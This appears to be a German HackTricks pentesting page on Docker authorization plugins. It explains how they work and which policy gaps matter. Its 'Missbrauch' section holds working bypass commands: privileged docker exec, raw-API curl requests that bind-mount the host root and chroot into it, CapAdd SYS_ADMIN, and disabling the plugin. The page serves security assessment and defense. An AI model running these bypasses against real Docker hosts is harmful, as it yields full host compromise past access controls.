# Runtime-Autorisierungs-Plugins

## Überblick

Runtime-Autorisierungs-Plugins sind eine zusätzliche Policy-Ebene, die entscheidet, ob ein Aufrufer eine bestimmte Daemon-Aktion ausführen darf. Docker ist das klassische Beispiel. Standardmäßig hat jeder, der mit dem Docker-Daemon kommunizieren kann, effektiv weitreichende Kontrolle darüber. Authorization Plugins versuchen, dieses Modell einzugrenzen, indem sie den authentifizierten Benutzer und die angeforderte API-Operation prüfen und die Anfrage anschließend entsprechend der Policy erlauben oder ablehnen.

Dieses Thema verdient eine eigene Seite, da es das Exploitation-Modell verändert, sobald ein Angreifer bereits Zugriff auf eine Docker API oder auf einen Benutzer in der `docker`-Gruppe hat. In solchen Umgebungen lautet die Frage nicht mehr nur: "Kann ich den Daemon erreichen?", sondern auch: "Ist der Daemon durch eine Authorization Layer eingeschränkt, und falls ja, kann diese über nicht behandelte Endpoints, schwaches JSON-Parsing oder Berechtigungen zur Plugin-Verwaltung umgangen werden?"

## Funktionsweise

Wenn eine Anfrage den Docker-Daemon erreicht, kann das Authorization Subsystem den Anfragekontext an ein oder mehrere installierte Plugins weitergeben. Das Plugin sieht die Identität des authentifizierten Benutzers, die Details der Anfrage, ausgewählte Header sowie Teile des Request- oder Response-Bodys, sofern der Content-Type dafür geeignet ist. Mehrere Plugins können verkettet werden, und der Zugriff wird nur gewährt, wenn alle Plugins die Anfrage erlauben.

Dieses Modell klingt robust, aber seine Sicherheit hängt vollständig davon ab, wie umfassend der Policy-Autor die API verstanden hat. Ein Plugin, das `docker run --privileged` blockiert, aber `docker exec` ignoriert, alternative JSON-Schlüssel wie `Binds` auf oberster Ebene übersieht oder die Plugin-Administration erlaubt, kann ein falsches Gefühl der Einschränkung erzeugen, während weiterhin direkte Privilege-Escalation-Pfade offenbleiben.

## Häufige Plugin-Ziele

Wichtige Bereiche für ein Policy-Review sind:

- Endpoints zur Container-Erstellung
- `HostConfig`-Felder wie `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` und Optionen zur gemeinsamen Nutzung von Namespaces
- das Verhalten von `docker exec`
- Endpoints zur Plugin-Verwaltung
- alle Endpoints, die Runtime-Aktionen außerhalb des vorgesehenen Policy-Modells indirekt auslösen können

Historisch machten Beispiele wie Twists `authz`-Plugin und einfache Educational-Plugins wie `authobot` dieses Modell leicht untersuchbar, da ihre Policy-Dateien und Codepfade zeigten, wie das Mapping von Endpoints zu Aktionen tatsächlich implementiert wurde. Für Assessment-Arbeiten ist die wichtige Erkenntnis, dass der Policy-Autor die vollständige API-Oberfläche verstehen muss und nicht nur die sichtbarsten CLI-Befehle.

## Missbrauch

Das erste Ziel besteht darin, herauszufinden, was tatsächlich blockiert wird. Wenn der Daemon eine Aktion ablehnt, leakt der Fehler häufig den Namen des Plugins, was dabei hilft, die eingesetzte Kontrolle zu identifizieren:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Wenn du ein umfassenderes Endpunkt-Profiling benötigst, sind Tools wie `docker_auth_profiler` nützlich, da sie die ansonsten sich wiederholende Aufgabe automatisieren, zu überprüfen, welche API-Routen und JSON-Strukturen vom Plugin tatsächlich erlaubt werden.

Wenn die Umgebung ein benutzerdefiniertes Plugin verwendet und du mit der API interagieren kannst, liste auf, welche Objektfelder tatsächlich gefiltert werden:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Diese Prüfungen sind wichtig, weil viele Autorisierungsfehler feldspezifisch und nicht konzeptspezifisch sind. Ein Plugin kann ein CLI-Muster ablehnen, ohne die äquivalente API-Struktur vollständig zu blockieren.

### Vollständiges Beispiel: `docker exec` fügt nach der Container-Erstellung Privilegien hinzu

Eine Richtlinie, die die Erstellung privilegierter Container blockiert, aber die Erstellung nicht eingeschränkter Container zusammen mit `docker exec` erlaubt, kann dennoch umgangen werden:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Wenn der Daemon den zweiten Schritt akzeptiert, hat der Benutzer einen privilegierten interaktiven Prozess innerhalb eines Containers wiedererlangt, den der Policy-Autor für eingeschränkt hielt.

### Vollständiges Beispiel: Bind Mount über Raw API

Einige fehlerhafte Policies prüfen nur eine JSON-Form. Wenn der Bind Mount des Root-Dateisystems nicht konsistent blockiert wird, kann der Host weiterhin eingebunden werden:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Dieselbe Idee kann auch unter `HostConfig` erscheinen:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Die Auswirkung ist eine vollständige Flucht aus dem Host-Dateisystem. Das interessante Detail ist, dass der bypass aus einer unvollständigen Richtlinienabdeckung und nicht aus einem Kernel-Bug resultiert.

### Vollständiges Beispiel: Nicht überprüftes Capability-Attribut

Wenn die Policy vergisst, ein Capability-bezogenes Attribut zu filtern, kann der Angreifer einen Container erstellen, der eine gefährliche Capability zurückerlangt:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Sobald `CAP_SYS_ADMIN` oder eine ähnlich starke Capability vorhanden ist, werden viele in [capabilities.md](protections/capabilities.md) und [privileged-containers.md](privileged-containers.md) beschriebenen Breakout-Techniken erreichbar.

### Vollständiges Beispiel: Deaktivieren des Plugins

Wenn Plugin-Management-Operationen erlaubt sind, besteht der sauberste Bypass möglicherweise darin, die Kontrolle vollständig zu deaktivieren:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Dies ist ein Richtlinienfehler auf Control-Plane-Ebene. Die Autorisierungsebene ist vorhanden, aber der Benutzer, dessen Berechtigungen sie einschränken sollte, verfügt weiterhin über die Berechtigung, sie zu deaktivieren.

## Prüfungen

Diese Befehle dienen dazu festzustellen, ob eine Richtlinienebene vorhanden ist und ob sie vollständig oder oberflächlich zu sein scheint.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Was ist hier interessant:

- Denial-Messages, die einen Plugin-Namen enthalten, bestätigen eine Autorisierungsschicht und verraten häufig die genaue Implementierung.
- Eine für den Angreifer sichtbare Plugin-Liste kann ausreichen, um festzustellen, ob Deaktivierungs- oder Neukonfigurationsvorgänge möglich sind.
- Eine Policy, die nur offensichtliche CLI-Aktionen blockiert, aber keine direkten API-Anfragen, sollte als umgehbar betrachtet werden, bis das Gegenteil nachgewiesen ist.

## Laufzeit-Standardeinstellungen

| Runtime / Plattform | Standardzustand | Standardverhalten | Häufige manuelle Schwächung |
| --- | --- | --- | --- |
| Docker Engine | Standardmäßig nicht aktiviert | Der Zugriff auf den Daemon ist praktisch vollständig oder gar nicht möglich, sofern kein Autorisierungs-Plugin konfiguriert ist | unvollständige Plugin-Policy, Blacklists statt Allowlists, Zulassen der Plugin-Verwaltung, Blindstellen auf Feldebene |
| Podman | Kein gängiges direktes Äquivalent | Podman stützt sich typischerweise stärker auf Unix-Berechtigungen, rootless-Ausführung und Entscheidungen zur API-Exponierung als auf Docker-ähnliche Authz-Plugins | umfassendes Exponieren einer rootful-Podman-API, schwache Socket-Berechtigungen |
| containerd / CRI-O | Anderes Kontrollmodell | Diese Runtimes stützen sich normalerweise auf Socket-Berechtigungen, Vertrauensgrenzen auf Node-Ebene und Controls höherer Orchestrator-Ebenen statt auf Docker-Authz-Plugins | Einbinden des Sockets in Workloads, schwache Annahmen über das lokale Vertrauen auf dem Node |
| Kubernetes | Verwendet Authn/Authz auf den Ebenen von API-Server und Kubelet, nicht Docker-Authz-Plugins | Cluster-RBAC und Admission-Controls sind die zentrale Policy-Schicht | zu weitreichendes RBAC, schwache Admission-Policy, direktes Exponieren von Kubelet- oder Runtime-APIs |

{{#include ../../../banners/hacktricks-training.md}}
